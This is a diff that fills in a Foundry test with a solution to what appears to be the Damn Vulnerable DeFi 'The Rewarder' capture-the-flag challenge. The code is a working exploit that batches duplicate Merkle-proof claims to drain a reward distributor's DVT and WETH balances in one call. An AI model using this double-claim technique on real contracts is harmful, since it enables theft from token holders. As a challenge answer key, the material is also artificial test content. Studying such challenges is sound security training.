@@ -148,7 +148,52 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        console.log(player);    //0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 playerClaimableDVT = 11524763827831882;
+        uint256 playerClaimableWETH = 1171088749244340;
+        uint256 repeatClaimDVTCount = dvt.balanceOf(address(distributor))/playerClaimableDVT;
+        uint256 repeatClaimWETHCount = weth.balanceOf(address(distributor))/playerClaimableWETH;
+        uint totalClaims = repeatClaimDVTCount+repeatClaimWETHCount;
+        console.log("before claim dvt, distributor balance: ", dvt.balanceOf(address(distributor)));
+        console.log("before claim weth, distributor balance: ", weth.balanceOf(address(distributor)));
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        Claim[] memory inputClaims = new Claim[](totalClaims);
+        for (uint i = 0; i < totalClaims; ++i) {
+            if(i< repeatClaimDVTCount){
+                inputClaims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerClaimableDVT,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves, 188)  //player's address is at index 188
+                });
+            } else{
+                inputClaims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerClaimableWETH,
+                    tokenIndex: 1,
+                    proof: merkle.getProof(wethLeaves, 188)  //player's address is at index 188
+                });
+            }
+        }
+
+        //run exploit
+        vm.startPrank(player);
+        distributor.claimRewards({inputClaims: inputClaims, inputTokens: tokensToClaim});
+
+        //check if exploit is successful
+        console.log("after claim dvt, distributor balance: ", dvt.balanceOf(address(distributor)));
+        console.log("after claim weth, distributor balance: ", weth.balanceOf(address(distributor)));
+
+        //transfer exploited funds to recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
